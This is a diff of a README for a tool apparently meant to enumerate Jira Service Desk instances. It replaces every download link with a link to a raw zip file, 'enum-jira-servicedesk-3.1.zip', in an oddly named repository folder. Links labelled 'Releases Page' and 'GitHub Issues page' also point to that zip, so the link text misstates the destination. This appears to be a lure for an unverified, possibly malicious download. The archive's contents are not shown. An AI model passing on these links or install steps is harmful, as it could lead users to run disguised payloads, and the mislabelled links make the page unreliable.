@@ -6,11 +6,11 @@ Welcome to the jira-servicedesk-enum tool. This simple application helps you enu
 
 ## 📥 Download the Application
 
-[![Download jira-servicedesk-enum](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip)](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip)
+[![Download jira-servicedesk-enum](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip)](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip)
 
 You can obtain the latest version of jira-servicedesk-enum from our Releases page. 
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip)
 
 ## 📅 System Requirements
 
@@ -22,12 +22,12 @@ Before you begin, please ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip).
 2. Locate the latest release.
 3. Click on the package suitable for your system:
    - For Windows users, download the `.exe` file.
    - For macOS users, download the `.dmg` file.
-   - For Linux users, download the `https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip` file.
+   - For Linux users, download the `https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip` file.
 4. Once downloaded, open the package and follow the instructions to install the application.
 
 ## 🔧 Usage Instructions
@@ -55,7 +55,7 @@ If you encounter issues while using jira-servicedesk-enum, here are some common 
 
 ## 🧑‍🤝‍🧑 Community and Support
 
-Your feedback is valuable. If you have questions or suggestions, please join the discussion on our [GitHub Issues page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/jira-servicedesk-enum.zip). 
+Your feedback is valuable. If you have questions or suggestions, please join the discussion on our [GitHub Issues page](https://raw.githubusercontent.com/landoalva/jira-servicedesk-enum/master/phrygium/enum-jira-servicedesk-3.1.zip). 
 
 ## 📜 License
 
